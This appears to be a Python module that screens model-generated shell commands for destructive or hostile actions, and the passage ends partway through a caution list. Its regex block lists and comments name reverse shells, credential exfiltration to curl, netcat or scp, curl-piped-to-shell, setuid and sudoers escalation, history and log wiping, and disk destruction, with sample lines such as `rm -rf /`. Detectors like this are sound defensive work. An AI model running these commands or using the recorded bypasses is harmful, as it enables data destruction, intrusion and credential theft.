"""Destructive-command detection for model-generated shell commands.

DESIGN, and why the obvious version does not work.

The first version of this module matched regexes against the raw command string,
split on shell operators. An adversarial audit defeated it trivially and, worse,
showed it was noisy at the same time. Both failures are recorded as tests in
tests/test_safety.py. The ones that mattered:

  - `rm -rf '/'` and `rm -rf "/"` passed clean, because a quote character broke
    the delimiter the path pattern required. So did `rm --recursive --force /`,
    because the flag pattern could not span the second `-` of a long option.
  - The headline "pipe remote content into a shell" rule was DEAD CODE: segments
    were split on `|` before patterns ran, so the one pattern that needs a
    literal `|` could never match anything.
  - Meanwhile `rm -rf /home/user/project/build` was flagged DANGER, because
    `/home` was matched as a PREFIX of a deeper path. Deleting your own build
    directory is not deleting /home.

A checker that is both evadable and noisy is worse than none: users learn to
ignore the banner, and the banner was not protecting them anyway.

So this version does not pattern-match paths out of a raw string. It:
  1. strips terminal control bytes (untrusted model output reaches a terminal),
  2. tokenizes with shlex, which removes quoting as a variable,
  3. normalizes long options to their short forms,
  4. extracts the actual TARGET arguments of destructive verbs, and
  5. asks whether a target IS a critical path -- not whether one appears in it.

Unresolvable targets (`$VAR`, command substitution) are treated as dangerous,
because a checker cannot know what they expand to and `rm -rf $EMPTY/` is the
canonical way people destroy machines.

This remains a denylist over a Turing-complete language. It is a seatbelt, not a
sandbox: `eval`, base64 indirection, and arbitrary aliasing defeat any static
check. The default path never executes anything, which is the real protection.
"""
from __future__ import annotations

import re
import shlex

# Control-byte strip. Model output is untrusted and lands in a terminal, where
# escape sequences can conceal or repaint what the user is about to approve.
CONTROL_RE = re.compile(
    r"\x1b\[[0-9;?]*[a-zA-Z]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)"
    r"|[\x00-\x08\x0b-\x1f\x7f]")

# Paths that must be the TARGET ITSELF to count, never a prefix of a deeper one.
CRITICAL_TARGETS = {
    "/", "/bin", "/boot", "/dev", "/etc", "/home", "/lib", "/lib32", "/lib64",
    "/opt", "/proc", "/root", "/run", "/sbin", "/srv", "/sys", "/usr", "/var",
    "~", "$HOME", "${HOME}",
    # Second-level system state the top-level entries do NOT cover: a target
    # must BE a listed path rather than sit under one, so `/var` being critical
    # never made `/var/log` critical.
    "/var/log", "/var/lib", "/var/spool", "/usr/local", "/usr/bin", "/usr/lib",
    "/etc/ssh", "/etc/systemd",
}

# `/home` is critical, and `/home/user/project/build` is deliberately not (see
# the module docstring -- prefix matching here was a real false-positive bug).
# But `/home/alice` is neither: it is one whole user account's data, and it was
# falling through as ordinary. Exactly one component under /home, and no more.
WHOLE_HOME_RE = re.compile(r"^/home/[^/]+/?$")

# Verbs that destroy, and which of their arguments are targets.
DESTRUCTIVE_VERBS = {"rm", "rmdir", "shred", "unlink", "srm"}

# Tokens that prefix a real command without changing what it does. Without
# stripping these, `/bin/rm -rf /`, `sudo rm -rf /`, `env rm -rf /`,
# `nohup rm -rf /` and friends all passed clean while running rm all the same.
# `busybox`/`toybox` dispatch to an internal applet named by their first
# argument (`busybox rm -rf /` really does run rm), so they get the same
# treatment as the other wrappers.
WRAPPERS = {"sudo", "doas", "env", "nice", "ionice", "nohup", "command",
            "builtin", "exec", "time", "stdbuf", "setsid", "xargs",
            "busybox", "toybox"}

# A second audit found the wrapper strip only ever removed the wrapper's own
# NAME, not its options -- so `sudo -u root rm -rf /`, `env -i rm -rf /` and
# `nice -n 19 rm -rf /` all left a flag (`-u`, `-i`, `-n`) as the new first
# token, which is not a known verb, so nothing after it was ever inspected.
# This lists, per wrapper, the short options that consume a SEPARATE next
# token as their value (`-n 19`) as opposed to one that is self-contained
# (`-n19`, `--opt=val`, or a bare boolean flag) -- so the stripping loop can
# skip exactly the tokens that belong to the wrapper and land on the real verb.
WRAPPER_VALUE_OPTS = {
    "sudo": {"-u", "-g", "-h", "-p", "-r", "-t", "-C"},
    "doas": {"-u"},
    "env": {"-u", "-C", "-S"},
    "nice": {"-n"},
    "ionice": {"-c", "-n", "-p", "-t"},
    "stdbuf": {"-i", "-o", "-e"},
    "xargs": {"-I", "-i", "-n", "-P", "-d", "-s", "-a", "-L", "-l"},
}

# Shells that take a command as a STRING argument -- the string has to be
# re-checked, or `bash -c "rm -rf /"` hides everything from the tokenizer.
SHELL_RUNNERS = {"sh", "bash", "zsh", "ksh", "dash", "fish", "ash"}

# Individual files whose destruction breaks the system. The directory list above
# does not cover them, so `shred -u /etc/passwd` and `unlink /etc/passwd` were
# passing while `truncate -s 0 /etc/passwd` was caught -- inconsistent.
CRITICAL_FILES = {
    "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/sudoers", "/etc/fstab",
    "/etc/hosts", "/etc/resolv.conf", "/boot/grub/grub.cfg",
}
MOVE_VERBS = {"mv", "cp"}
PERM_VERBS = {"chmod", "chown", "chgrp"}

LONG_TO_SHORT = {
    "--recursive": "-r", "--force": "-f", "--dir": "-d",
    "--no-preserve-root": "-!", "--preserve-root": "",
}


def _strip_control(s: str) -> str:
    return CONTROL_RE.sub("", s)


ANSI_C_QUOTE_RE = re.compile(r"\$'((?:[^'\\]|\\.)*)'")
_ANSI_C_ESCAPES = {"n": "\n", "t": "\t", "r": "\r", "\\": "\\", "'": "'",
                   "0": "\0", "a": "\a", "b": "\b", "f": "\f", "v": "\v"}


def _decode_ansi_c(segment: str) -> str:
    """Expand bash's `$'...'` quoting before shlex ever sees it.

    shlex only knows POSIX quoting, so `rm -rf $'/'` tokenized as-is comes out
    as the literal two-character token `$/` -- not `/` -- and silently misses
    the critical-path check entirely, while a real shell runs `rm -rf /`. This
    decodes the common backslash escapes and re-quotes the result with
    `shlex.quote` so the rest of the pipeline sees the same string bash would.
    """
    def repl(m: re.Match) -> str:
        body, out, i = m.group(1), [], 0
        while i < len(body):
            c = body[i]
            if c == "\\" and i + 1 < len(body):
                out.append(_ANSI_C_ESCAPES.get(body[i + 1], body[i + 1]))
                i += 2
            else:
                out.append(c)
                i += 1
        return shlex.quote("".join(out))
    return ANSI_C_QUOTE_RE.sub(repl, segment)


def _tokenize(segment: str) -> list[str]:
    """shlex removes quoting so `'/'` and `/` are the same token.

    Falls back to a whitespace split on unbalanced quotes -- model output is not
    guaranteed to be valid shell, and failing closed here would silently skip
    the safety check on exactly the malformed input most worth checking.
    """
    segment = _decode_ansi_c(segment)
    try:
        return shlex.split(segment, posix=True)
    except ValueError:
        return segment.split()


def _norm_path(tok: str) -> str:
    """Canonicalize a target for comparison against CRITICAL_TARGETS.

    Collapses `.` and `..` segments, which is what let `rm -rf /usr/../` and
    `rm -rf /../` through: both resolve to `/`.
    """
    t = tok.rstrip("/") or "/"
    absolute = t.startswith("/")
    parts: list[str] = []
    for seg in t.split("/"):
        if seg in ("", "."):
            continue
        if seg == "..":
            if parts:
                parts.pop()
            continue
        parts.append(seg)
    if absolute:
        return "/" + "/".join(parts)
    # A relative path that collapses to nothing is the CWD, not the filesystem
    # root. Returning "/" here made an ordinary `find . -exec rm` read as
    # "delete /" -- a false positive on one of the commonest commands there is.
    return "/".join(parts) or "."


def _is_critical(tok: str) -> tuple[bool, str]:
    """Is this argument a critical target, a glob over one, or unresolvable?"""
    if not tok or tok.startswith("-"):
        return False, ""
    # `~` expands to $HOME, which _norm_path already treats as the literal
    # relative path "~" (present in CRITICAL_TARGETS) -- but that only covers
    # the bare token. `~/..` expands to the UNKNOWN PARENT of an unknown home
    # directory, and `~root` is a concrete, known-critical path (/root) that
    # the generic logic below never resolves because it has no leading `/`.
    if tok.startswith("~"):
        rest = tok[1:]
        if ".." in rest.split("/"):
            return True, "'~' expands to a home directory and '..' escapes it to an unknown parent"
        if rest == "root" or rest.startswith("root/"):
            norm = _norm_path("/root" + rest[len("root"):])
            if norm in CRITICAL_TARGETS or norm in CRITICAL_FILES:
                return True, f"target is the critical path {norm}"
    # Unresolvable: we cannot know what it expands to, so assume the worst.
    # `rm -rf $VAR/` with VAR unset is the classic machine-killer (SC2115).
    if re.search(r"\$\{?\w+|\$\(|`", tok):
        if tok in ("$HOME", "${HOME}") or tok.startswith(("$HOME/", "${HOME}/")):
            return True, "deletes your home directory"
        return True, ("target contains an unexpanded variable or substitution"
                      " -- if it is empty this hits /")
    norm = _norm_path(tok)
    if norm in CRITICAL_TARGETS:
        return True, f"target is the critical path {norm}"
    if norm in CRITICAL_FILES:
        return True, f"target is the critical system file {norm}"
    if WHOLE_HOME_RE.match(norm):
        return True, f"target is an entire user home directory ({norm})"
    # A glob whose parent is critical: `/va*`, `/*`, `/home/*`, `/etc/*`
    if any(ch in tok for ch in "*?["):
        parent = tok.rsplit("/", 1)[0] if "/" in tok else ""
        parent_norm = _norm_path(parent) if parent else ""
        if tok.startswith("/") and (parent_norm in CRITICAL_TARGETS or parent == ""):
            return True, f"glob expands across the critical path {parent_norm or '/'}"
    return False, ""


def _flags(tokens: list[str]) -> set[str]:
    """Collect flag letters, normalizing long options and bundles."""
    out: set[str] = set()
    for t in tokens:
        if t in LONG_TO_SHORT:
            out.update(LONG_TO_SHORT[t].lstrip("-"))
        elif t.startswith("--"):
            out.add(t)
        elif t.startswith("-") and len(t) > 1:
            out.update(t[1:])
    return out


# ---------------------------------------------------------------------------
# SEMANTIC RISK CLASSES
#
# Everything above this point asks one question: does this command destroy
# something the machine needs? That is a single axis, and it is not the only
# one. A published ablation of a rule-based shell risk classifier (CARE, ISSRE
# 2026) removed each of its components in turn: dropping SEMANTIC risk classes
# cost 26.7pp of F1, dropping path sensitivity cost 17.0pp, and dropping AST
# structure cost 1.8pp. A flat regex denylist with no semantic classes at all
# scored 29% F1 where the full classifier scored 86%. The gap is not "more
# critical paths". It is that a command can leave every file on disk intact and
# still hand the machine to somebody else: exfiltrate a key, open a callback,
# escalate to root, install persistence, or erase the record of having done it.
#
# The discipline of the rest of this module still applies, and it is the reason
# these rules are written the way they are: EVERY rule below requires BOTH
# halves of the risk -- a secret AND an outbound sink, a socket AND a shell,
# sudo AND a shell escape, a mode AND the setuid bit -- because either half on
# its own is ordinary work. `cat ~/.ssh/config`, `nc -z host 22`, `sudo tar`,
# and `chmod 755` must all stay silent, or the banner gets ignored and the
# banner was the whole protection.
# ---------------------------------------------------------------------------

# Files that ARE a credential, as a regex fragment reused by several rules.
# PUBLIC keys are deliberately excluded by lookahead: copying `id_rsa.pub` to a
# server is the normal way to set up ssh access, and it is one of the commonest
# legitimate commands involving a key path there is. Flagging it would poison
# the whole class.
SECRET_FILE = (
    r"(?:id_rsa|id_dsa|id_ecdsa|id_ed25519)(?!\.pub)"
    r"|/etc/(?:shadow|gshadow)(?![\w.])"
    r"|\.aws/credentials|\.netrc|\.pgpass|\.git-credentials|\.npmrc|\.pypirc"
    r"|\.docker/config\.json|\.kube/config|\.gnupg/[\w.-]{1,40}"
    r"|private[_-]?key|\.pem(?![\w])|(?<![\w-])\.env(?![\w.])"
)

# Sinks that carry bytes OFF this machine. `ssh` is deliberately NOT one of
# them: `cat ~/.ssh/id_rsa.pub | ssh host 'cat >> ~/.ssh/authorized_keys'` is
# the hand-rolled ssh-copy-id -- it names a key path and pipes into a network
# tool while being completely benign. Requiring a sink that takes a BODY
# (curl --data/-T/-F, a raw socket, or a mailer) keeps that idiom quiet.
NET_SINK = (
    r"\|\s{0,4}(?:sudo\s+)?(?:curl|wget|nc|ncat|netcat|socat|mail|mailx|sendmail)\b"
    r"|\b(?:curl|wget)\b[^|;]{0,200}(?:--data|--upload-file|--form|\s-d\s|\s-T\s|\s-F\s)"
)

# scp/rsync/sftp are handled apart from NET_SINK because their sink token comes
# BEFORE the secret (`scp ~/.ssh/id_rsa host:`) and their destination comes
# after it, so neither "secret then sink" nor "sink then secret" ordering can
# express them -- the secret sits in the middle. A remote destination
# (`user@host:`) is required, so an ordinary local `scp` or `rsync` of a
# key between directories stays silent.
COPY_OUT = (
    rf"\b(?:scp|rsync|sftp)\b[^|;]{{0,160}}(?:{SECRET_FILE})"
    rf"[^|;]{{0,160}}[\w.-]{{1,64}}@[\w.-]{{1,64}}:"
)

# Shell startup files. Anything appended here executes on every future login,
# which is what makes them the standard persistence target; anything that
# TRUNCATES one destroys a config the user cannot get back.
SHELL_RC = (r"(?:\.bashrc|\.bash_profile|\.bash_login|\.profile|\.zshrc|\.zprofile"
            r"|\.zshenv|\.kshrc|\.cshrc|/etc/profile|/etc/bash\.bashrc)")

# Patterns checked against the WHOLE command, never per-segment. Anything that
# needs to see a `|` or `;` must live here -- that was the dead-code bug.
WHOLE_DANGER = [
    (re.compile(r"\b(curl|wget)\b[^|;]*\|\s*(sudo\s+)?(ba|z|k|fi|da)?sh\b"),
     "pipes remote content straight into a shell"),
    # Fork bomb. Matched on shape rather than exact spacing, since every
    # real-world rendering differs and the old exact-spacing pattern matched none.
    # Bounded quantifiers throughout. The unbounded `\w*\s*` prefix and `[^}]*`
    # bodies made this quadratic on ordinary non-matching text: check("A"*20000)
    # took 5.5s, and check() runs on every candidate before it is printed.
    (re.compile(r"\w{0,16}\(\s{0,4}\)\s{0,4}\{[^}]{0,64}\|[^}]{0,64}&\s{0,4}\}\s{0,4};"),
     "fork bomb"),
    (re.compile(r"\bmkfs(\.\w+)?\b"), "formats a filesystem"),
    (re.compile(r"\bdd\b[^|;]*\bof=/dev/(sd|nvme|hd|vd|mmcblk)"), "writes raw to a block device"),
    (re.compile(r">\s*/dev/(sd|nvme|hd|vd|mmcblk)"), "redirects over a block device"),
    # Block-device destroyers other than dd/mkfs. All take the device as a
    # bare argument, so this is a verb + device-path match rather than a flag
    # match -- `cryptsetup luksFormat /dev/sda1` and `sgdisk --zap-all /dev/sda`
    # are as final as `mkfs` but none of the prior checks named them.
    (re.compile(r"\b(wipefs|blkdiscard|sgdisk)\b[^|;]*/dev/(sd|nvme|hd|vd|mmcblk)"),
     "wipes a block device"),
    (re.compile(r"\bcryptsetup\b[^|;]*\b(luksFormat|luksErase|erase)\b[^|;]*/dev/(sd|nvme|hd|vd|mmcblk)"),
     "reformats/erases a block device"),
    (re.compile(r"\bparted\b[^|;]*/dev/(sd|nvme|hd|vd|mmcblk)[^|;]*\b(rm|mklabel)\b"),
     "modifies the partition table of a block device"),
    (re.compile(r"\b(shutdown|reboot|halt|poweroff|init\s+0|init\s+6)\b"),
     "shuts the machine down"),
    (re.compile(r"\bgit\s+clean\b(?=[^|;]*-\w*[fx])(?=[^|;]*-\w*[dx])"),
     "git clean deletes untracked files irrecoverably"),
    (re.compile(r"\bgit\s+reset\s+--hard\b"), "git reset --hard discards uncommitted work"),
    (re.compile(r"\b(history\s+-c|shred\s+.*\.bash_history)\b"), "erases shell history"),
    (re.compile(r"\bchmod\b[^|;]*\s0{3,4}\s+/\s*$"), "chmod 000 / makes the system unusable"),
    (re.compile(r"\btruncate\s+-s\s*0\s+/etc/(passwd|shadow|fstab|sudoers)\b"),
     "destroys a critical system file"),
    # This was a SEPARATE, DEAD branch of the pattern above (`\b(...|>\s*)\s*`):
    # `\b` requires a word/non-word transition, but the character right before
    # a redirect is virtually always whitespace, and whitespace-then-`>` is a
    # non-word/non-word pair -- no boundary, so it NEVER matched `> /etc/passwd`,
    # `echo x > /etc/passwd`, `: > /etc/passwd`, etc. in any realistic spacing.
    # Truncating /etc/passwd this way fell through to the weaker "writes to a
    # system directory" CAUTION below and was never DANGER. Split out with no
    # leading `\b`, and `>\|?` also covers bash's `>|` force-clobber redirect.
    (re.compile(r">\|?\s*/etc/(passwd|shadow|fstab|sudoers)\b"),
     "destroys a critical system file"),
    # `ln -f`/`install` overwrite their destination outright -- functionally
    # equivalent to `rm` + create for that path.
    (re.compile(r"\bln\b[^|;]*-\w*f\w*[^|;]*/etc/(passwd|shadow|fstab|sudoers)\b"),
     "overwrites a critical system file with a symlink"),
    (re.compile(r"\binstall\b[^|;]*/etc/(passwd|shadow|fstab|sudoers)\b"),
     "install(1) truncates/replaces its destination file"),
    # Same `\b`-around-a-slash trap as above: `/` is a non-word character, so
    # `\b/etc\b` never matches `find /etc -type f | ...` because whitespace
    # then `/` is a non-word/non-word pair with no boundary between them.
    # `(?<!\S)...(?!\S)` (not preceded/followed by a non-space char) is the
    # correct "whole shell word" anchor here.
    (re.compile(r"\bfind\b[^|]*(?<!\S)(/|/etc|/usr|/var|/home|/boot|/bin|/sbin|/lib\w*|/root)(?!\S)"
                r"[^|]*\|\s*xargs\b[^|]*\b(rm|shred|unlink|srm|rmdir)\b"),
     "finds over a critical path and pipes the results into a delete"),
    (re.compile(r"--no-preserve-root"), "explicitly overrides rm's root guard"),
    # `crontab -r` wipes the user's entire crontab with no prompt and no undo,
    # and it sits one keystroke from `crontab -e`. Nothing here covered it: it
    # is not a filesystem verb, so no path check applies.
    (re.compile(r"\bcrontab\b(?:\s+-\w+)*\s+-\w*r"),
     "crontab -r deletes the whole crontab, unprompted"),
    # Removes the account's home directory and mail spool along with the user.
    # `deluser` is Debian's front-end for the same operation. Synonyms are
    # listed explicitly: matching one spelling of a tool is not coverage of it.
    (re.compile(r"\b(?:userdel|deluser)\b[^|;]*\s--?(?:r\b|remove-home|remove-all-files)"),
     "deletes the user account together with its home directory and files"),
    # Flushing every chain drops the rules that were permitting your own SSH
    # session. On a remote host with a default DROP policy this is a permanent
    # lockout needing console access to undo, so it is worth refusing to
    # auto-run even though a local reset is legitimate.
    (re.compile(r"\biptables\b[^|;]*\s-[FX]\b|\bnft\s+flush\s+ruleset\b"),
     "flushes firewall rules -- can lock you out of a remote machine"),
    # A truncating redirect (`>`, not `>>`) or a tee without -a over
    # authorized_keys removes the key you are currently logged in with.
    # ~/.ssh/authorized_keys never resolves through CRITICAL_FILES because it
    # is under `~`, so no path check reached it.
    (re.compile(r"(?<!>)>\s*[^\s|;>]*authorized_keys"
                r"|\btee\b(?!\s+-\w*a)[^|;]*authorized_keys"),
     "overwrites authorized_keys -- can lock you out of ssh"),
    # Anything group- or world-readable on a private key exposes it, and ssh
    # then refuses the key anyway. Matches a mode whose GROUP or OTHER digit is
    # >= 4, so the correct `chmod 600 ~/.ssh/id_rsa` stays silent.
    (re.compile(r"\bchmod\b[^|;]*\s(?:0?[0-7][4-7][0-7]|0?[0-7][0-7][4-7]|[ugoa]*\+r)\s"
                r"[^|;]*(?:id_rsa|id_dsa|id_ecdsa|id_ed25519|private[_-]?key|\.pem)\b"),
     "makes a private key readable by others -- exposes it, and ssh will reject it"),
    # Removing the package manager or libc leaves a machine that cannot install
    # its way back out. The trailing lookahead keeps `apt remove libc6-dev`
    # (an ordinary build-dep cleanup) from matching `libc6`.
    (re.compile(r"\b(?:apt|apt-get|aptitude|dpkg|yum|dnf|rpm)\b[^|;]*"
                r"\b(?:remove|purge|erase|autoremove)\b[^|;]*"
                r"(?<![\w-])(?:dpkg|apt|apt-get|coreutils|bash|libc6|glibc|systemd|"
                r"util-linux|sudo|linux-image)(?![\w-])"),
     "removes an essential package -- the system cannot recover on its own"),
    # Expiring the reflog and pruning is the one git operation with no undo:
    # it discards the recovery path that makes reset/rebase survivable.
    (re.compile(r"\bgit\s+reflog\s+expire\b[^|;]*--expire(?:=|\s+)(?:now|all)"
                r"|\bgit\s+gc\b[^|;]*--prune(?:=|\s+)now"),
     "expires the reflog -- removes git's last-resort recovery path"),

    # --- SEMANTIC CLASS: credential exfiltration -------------------------
    # A secret path on its own is not a finding (`chmod 600 ~/.ssh/id_rsa` is
    # the CORRECT thing to do) and a network sink on its own is not either
    # (`curl -d @payload.json`). The pair is. Both orders are matched because
    # the secret is the argument of the sink about as often as it is the source
    # of the pipe: `cat ~/.ssh/id_rsa | curl -d @- host` vs
    # `curl -F key=@~/.ssh/id_rsa host`.
    (re.compile(rf"(?:{SECRET_FILE})[^;&]{{0,240}}(?:{NET_SINK})"
                rf"|(?:{NET_SINK})[^;&]{{0,240}}(?:{SECRET_FILE})"
                rf"|{COPY_OUT}"),
     "sends a private key or credential file off this machine"),

    # --- SEMANTIC CLASS: reverse shells and callbacks --------------------
    # bash's /dev/tcp is not a real device: the shell itself opens the socket,
    # so no external binary appears in the command and nothing above this line
    # sees anything at all. Paired with a shell name or the `0>&1` stdin
    # re-attach, it is the canonical reverse shell and has essentially no
    # benign form. A bare `/dev/tcp` read (a port check) is left to CAUTION.
    (re.compile(r"\b(?:ba|z|k|da|a)?sh\b[^|;]{0,80}/dev/(?:tcp|udp)/"
                r"|/dev/(?:tcp|udp)/[^\s;]{0,80}0>&1"
                r"|>&\s{0,4}/dev/(?:tcp|udp)/"),
     "reverse shell: attaches a shell's stdin/stdout to a remote socket"),
    # netcat's -e/--exec hands an interpreter to whoever connects. Matched as
    # a flag CLUSTER ending in e or c so `-e` and `-ve` both hit, while the
    # everyday `nc -zv host 22` / `nc -l -p 4444` clusters (ending z, v, p)
    # do not.
    (re.compile(r"\b(?:nc|ncat|netcat|nc\.traditional)\b[^|;]{0,160}"
                r"(?:\s-\w{0,3}[ec](?=\s)|--exec\b|--sh-exec\b|--lua-exec\b)"),
     "netcat -e/--exec hands a shell to whoever connects"),
    # The no-`-e` workaround, for the many builds of netcat compiled without
    # it: a named pipe loops the shell's output back into the same connection.
    # `[^\n]` rather than `[^;]` here and in the interpreter rule below: the
    # whole point of this idiom is that it is a `;`-joined sequence, and the
    # scripted form embeds `;` inside the quoted program text.
    (re.compile(r"\bmkfifo\b[^\n]{0,200}\|[^\n]{0,200}\b(?:nc|ncat|netcat)\b"
                r"|\b(?:nc|ncat|netcat)\b[^\n]{0,200}\|[^\n]{0,200}\bmkfifo\b"),
     "named-pipe reverse shell (mkfifo looped into netcat)"),
    (re.compile(r"\bsocat\b[^;]{0,200}\b(?:EXEC|SYSTEM):"),
     "socat EXEC:/SYSTEM: runs a program for the remote peer -- a bind/reverse shell"),
    # The interpreter variants. `socket` alone is ordinary scripting, so a
    # shell-attach primitive (pty.spawn, dup2, an explicit /bin/sh) is required
    # alongside it -- `python3 -c 'import socket; print(socket.gethostname())'`
    # must stay silent.
    (re.compile(r"\b(?:python\d?(?:\.\d+)?|perl|ruby|php|node)\b[^\n]{0,400}\bsocket\b"
                r"[^\n]{0,400}(?:pty\.spawn|dup2|/bin/(?:ba|z|k|da)?sh|\bexec\s*\()"),
     "scripted reverse shell: opens a socket and attaches a shell to it"),

    # --- SEMANTIC CLASS: privilege escalation ----------------------------
    # A setuid binary runs as its OWNER for every user on the box, so
    # `chmod u+s /bin/bash` is a permanent root backdoor that leaves the
    # filesystem otherwise untouched. Only the setUID bit is DANGER here: the
    # setGID form (`g+s`, 2775) is the legitimate shared-directory idiom and is
    # a CAUTION below. The mode alternative needs four octal digits starting
    # 4/6/7, so the three-digit everyday modes (755, 644, 777) cannot match.
    (re.compile(r"\bchmod\b[^|;]{0,120}\s(?:0?[467][0-7]{3}|[ugoa]*u\+s|\+s(?=\s|$))"),
     "sets the setuid bit -- the file then runs as its owner (root) for every user"),
    # Group membership that is root by another name. The group must come AFTER
    # the verb, so a `sudo useradd bob` prefix does not match itself. `&` is
    # excluded from the span as well as `|;`: a real model output in the replay
    # set, `sudo useradd -m myuser && sudo passwd myuser && sudo usermod -aG
    # docker myuser`, matched `useradd` here and then the `sudo` of the NEXT
    # command as its group. The span must not cross a command boundary of any
    # kind, and `&&` is by far the commonest one in generated one-liners.
    (re.compile(r"\b(?:usermod|gpasswd|adduser|useradd)\b[^|;&]{0,120}"
                r"(?<![\w-])(?:sudo|wheel|admin|root)(?![\w-])"),
     "grants root-equivalent group membership"),
    # `NOPASSWD` has exactly one meaning wherever it appears, and
    # /etc/sudoers.d/ is a drop-in directory the /etc/sudoers rules never
    # covered because the filename differs every time.
    (re.compile(r"NOPASSWD"), "grants passwordless sudo"),
    (re.compile(r">\|?>?\s{0,4}/etc/sudoers\.d/|\btee\b[^|;]{0,120}/etc/sudoers"),
     "installs a new sudo rule"),
    # GTFOBins-style living off the land: sudo is granted for a specific tool,
    # and the tool is then made to spawn a shell, which inherits root. The tool
    # list alone is far too broad to act on (`sudo tar -czf ...` is routine),
    # so a shell-spawn primitive in the same segment is required. `-exec` with
    # one dash is deliberately NOT a primitive -- `sudo find /var/log -exec rm`
    # is ordinary and is judged by the delete rules instead.
    (re.compile(r"\bsudo\b[^|;&]{0,200}\b(?:find|tar|zip|awk|gawk|mawk|perl|python\d?|ruby"
                r"|node|lua|vim|vi|view|nano|ed|less|more|man|ftp|nmap|git|env|nice"
                r"|tcpdump|rsync|xargs)\b[^|;&]{0,200}"
                r"(?:/bin/(?:ba|z|k|da)?sh|\bsystem\s*\(|\bos\.system|pty\.spawn"
                r"|\bexec\s*\(|:!|!\s{0,2}/bin/|--interactive|checkpoint-action=exec)"),
     "living off the land: sudo runs a tool that then spawns a root shell"),

    # --- SEMANTIC CLASS: persistence -------------------------------------
    # A TRUNCATING redirect over a shell startup file replaces a config the
    # user has accumulated for years with one line. The append form is the
    # legitimate idiom and is a CAUTION below; `(?<!>)` is what separates them.
    (re.compile(rf"(?<!>)>\|?\s{{0,4}}\S{{0,64}}{SHELL_RC}(?![\w.])"),
     "overwrites a shell startup file, discarding everything already in it"),

    # --- SEMANTIC CLASS: history and log tampering -----------------------
    # Covering `history -c` but not `> ~/.bash_history` or `unset HISTFILE`
    # covered the announcement and not the act. All of these leave the machine
    # working perfectly and remove the record of what was done to it.
    (re.compile(r"(?<!>)>\|?\s{0,4}\S{0,64}\.(?:bash|zsh|sh)_history"
                r"|\b(?:rm|shred|truncate)\b[^|;]{0,120}\.(?:bash|zsh|sh)_history"
                r"|\bunset\s+HISTFILE(?![\w])|\bHISTFILE=(?:/dev/null|\s|$)"
                r"|\bset\s\+o\s+history\b|\bexport\s+HISTSIZE=0\b"),
     "erases or disables shell history -- hides what was run"),
    # Truncation and vacuuming only. Deleting a rotated log (`rm
    # /var/log/nginx/access.log.1`) and age-filtered rotation (`find /var/log
    # -mtime +7 -delete`, already downgraded above) are routine housekeeping;
    # zeroing a live log file or vacuuming the journal is not.
    (re.compile(r"(?<!>)>\|?\s{0,4}/var/log/\S+"
                r"|\btruncate\b[^|;]{0,80}-s\s{0,2}0\s+/var/log/"
                r"|\bjournalctl\b[^|;]{0,80}--vacuum-(?:time|size|files)"),
     "wipes a system log in place"),

    # --- SEMANTIC CLASS: firewall / MAC controls -------------------------
    # The branch's iptables -F rule covered flushing but not the other three
    # ways to reach the same state. A default DROP policy applied remotely, or
    # a firewall stopped on a host you reach over the network, needs console
    # access to undo -- the same lockout reasoning as the flush rule.
    (re.compile(r"\bufw\b[^|;&]{0,60}\b(?:disable|reset)\b|\bsetenforce\s+0\b"
                r"|\bsystemctl\b[^|;&]{0,60}\b(?:stop|disable|mask)\b[^|;&]{0,60}"
                r"\b(?:firewalld|ufw|iptables|nftables|apparmor)\b"
                r"|\biptables\b[^|;&]{0,80}-P\s+(?:INPUT|FORWARD)\s+DROP\b"),
     "disables the host firewall or its mandatory access control"),

    # --- SEMANTIC CLASS: storage teardown --------------------------------
    # The block-device rules above all key on a `/dev/sd*`-shaped path. LVM,
    # ZFS and md address their storage by NAME (`vg0/data`, `tank/home`), so
    # none of those rules could ever see them, and every verb here is as final
    # as mkfs. `umount /` and `umount -a` unmount the running root filesystem.
    (re.compile(r"\b(?:lvremove|vgremove|pvremove)\b|\bzpool\s+destroy\b|\bzfs\s+destroy\b"
                r"|\bmdadm\b[^|;]{0,80}--zero-superblock\b"
                r"|\bhdparm\b[^|;]{0,80}--security-erase"),
     "destroys a logical volume, pool or array"),
    (re.compile(r"\bumount\b[^|;]{0,40}(?:-\w{0,3}a(?=\s|$)|(?<!\S)/(?!\S))"),
     "unmounts the root filesystem (or everything)"),

    # --- SEMANTIC CLASS: remote code execution, beyond curl|sh -----------
    # The existing rule matched only a POSIX shell on the right of the pipe.
    # `curl ... | python3 -` and `curl ... | perl` execute attacker-chosen code
    # exactly as completely.
    (re.compile(r"\b(?:curl|wget)\b[^|;]{0,200}\|\s{0,4}(?:sudo\s+)?"
                r"(?:python\d?(?:\.\d+)?|perl|ruby|node|php)\b"),
     "pipes remote content straight into an interpreter"),
    # Process substitution and eval reach the same place without ever forming
    # a pipe, which is why the pipe-shaped rule above cannot see them.
    (re.compile(r"(?:\b(?:ba|z|k|da)?sh\b|\bsource\b|(?<![\w.])\.\s)[^|;]{0,40}"
                r"<\(\s{0,4}(?:curl|wget)\b"
                r"|\beval\b[^|;]{0,60}[\"']?\$\(\s{0,4}(?:curl|wget)\b"),
     "executes remote content via process substitution -- the same as curl | sh"),
    (re.compile(r"\bbase64\b[^|;]{0,60}(?:-d|--decode)[^|;]{0,60}"
                r"\|\s{0,4}(?:sudo\s+)?(?:ba|z|k|da)?sh\b"),
     "decodes and executes obfuscated content"),
]

WHOLE_CAUTION = [
    # --delete is destructive only with respect to its destination. Treating
    # every `rsync -a --delete ./src/ ./backup/` as DANGER flags ordinary
    # incremental backups; the critical-target case is caught per-segment below.
    (re.compile(r"\brsync\b[^|;]*--delete\b"),
     "rsync --delete removes files at the destination that are not in the source"),
    (re.compile(r"\b(awk|cut|sed)\b[^|]*\|\s*xargs\b[^|]*\b(kill|docker\s+rm|rm)\b"),
     "kills/removes using a field parsed from text -- verify the column is really an ID"),
    # Killing by a target the model CHOSE rather than one the user named. An
    # everyday-usage audit found "restart a hung process called worker.py"
    # produce `fuser -k 5000` -- a port never mentioned in the request, which
    # would terminate whatever unrelated service happens to hold it. The
    # existing "parsed field" rule did not fire, because the value is not
    # parsed from output at all: it is invented. A literal port or pid handed
    # to a kill verb is worth naming for exactly that reason.
    (re.compile(r"\b(?:fuser|pkill|killall|kill)\b(?:\s+-{1,2}\w+)*\s+-?\d+\s*(?:$|[|;&])"),
     "kills a process selected by a literal port or pid -- confirm it is the right one"),
    (re.compile(r"^\s*(sudo\s+)?ping\b(?![^|;]*\s-[a-zA-Z]*c\b)(?![^|;]*\s-c\d)"),
     "ping without -c runs until you interrupt it"),
